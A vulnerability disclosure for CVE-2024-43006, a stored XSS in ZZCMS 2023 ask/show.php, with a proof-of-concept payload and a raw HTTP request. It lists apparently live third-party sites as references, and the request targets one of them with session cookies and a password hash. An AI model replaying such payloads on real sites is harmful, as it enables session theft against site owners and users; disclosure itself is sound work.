# ZZCMS 2023 储存型XSS ask/show.php

## CVE-ID

**CVE-2024-43006**

## Vulnerability type 
Cross Site Scripting (XSS)

## Vendor of the product(s)
http://www.zzcms.net/about/download.html



## Affected product(s)/code base

## Product	* Version	
ZZCMS
<=2023(latest)

## Optional

Has vendor confirmed or acknowledged the vulnerability? Yes 

## Attack type info 
Remote

Information Disclosure

## Affected component(s)

ask/show.php line 21 ,after the content parameter is obtained from the database, it passes through the stripfxg() function, which deletes the original escape of html characters, resulting in XSS vulnerability.
## Attack vector(s)

POST /user/ask_edit.php?action=add HTTP/1.1
Payload: classid=1&title=1112221&content=</div><ScRipt>alert(1)</ScRipt><div>&img=&jifen=0&Submit=%E5%8F%91%E5%B8%83

Note that the XSS can be seen in ask/show_{newsid}.html,if you brose into /ask,you can see all the asks include the test XSS one.Goto the ask/ and clink into the ask we just published,the XSS is executed.
## Suggested description of the vulnerability for use in the CVE info

A stored cross-site scripting (XSS) vulnerability exists in ZZCMS2023 in the ask/show.php file at line 21. An attacker can exploit this vulnerability by sending a specially crafted POST request to /user/ask_edit.php?action=add, which includes malicious JavaScript code in the 'content' parameter. When a user visits the ask/show_{newsid}.html page, the injected script is executed in the context of the user's browser, leading to potential theft of cookies, session tokens, or other sensitive information.

## Discoverer(s)/Credits info

GKDf1sh



## Reference(s) info

https://www.88zsw.com

http://www.818yyzs.com

https://www.qibai.cc

http://www.weixumu.cn

http://www.eshouyao.com

http://www.66988.tv/

http://www.dl580.tv/

## Additional information

POST /user/ask_edit.php?action=add HTTP/2
Host: www.88zsw.com
Cookie: PHPSESSID=lcpl5f7h3c8eiagjhtbael9ugi; UserName=admin1; PassWord=21232f297a57a5a743894a0e4a801fc3; userid=1493
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://www.88zsw.com
Referer: https://www.88zsw.com/user/ask.php?action=add
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

classid=1&title=1133321&content=</div><ScRipt>alert(1)</ScRipt><div>&img=&jifen=0&Submit=%E5%8F%91%E5%B8%83


Goto the ask/ and click into the ask we just published,the XSS is executed.
